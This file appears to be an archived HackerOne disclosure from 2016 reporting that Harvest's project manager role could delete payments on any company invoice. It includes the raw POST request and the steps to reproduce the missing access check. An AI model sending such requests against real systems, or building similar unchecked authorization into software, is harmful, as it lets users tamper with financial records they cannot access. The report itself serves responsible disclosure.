@@ -1,0 +1,40 @@
+ReportLink:https://hackerone.com/reports/159393
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/vijay_kumar1110
+ReportedTo:Harvest(harvest)
+BountyAmount:100.0
+Severity:
+State:Closed
+DateOfDisclosure:29.09.2016 23:03:39
+
+Summary:
+
+Hi Team,
+
+Description :  Project manager(Full Access) have Access to only assigned projects and he will have access to limited Invoices. But Project manager can Delete Payment of Any invoices in the company. The HTTP request Doesn't check whether Project manager have access to the project or not. 
+
+HTTP request : 
+
+POST /invoices/[Invoice_ID]/payments/[Payment_ID]HTTP/1.1
+Host: vijaygangani.harvestapp.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://vijaygangani.harvestapp.com/invoices/10392603
+Cookie: [Cookie_values]
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 128
+
+_method=delete&authenticity_token=[Oauth_token]
+
+Steps to reproduce : 
+In the above mentioned Request change the Invoice_ID and payment_ID Accordingly and send it to server by the Project manager who doesn't have access to this Invoice . You will see that the Payment will be deleted for that particular Invoice .
+
+
+Let me know if you need detailed Steps or Video poc for this issue.
+
+
+Best Regards !
+Vijay Kumar 
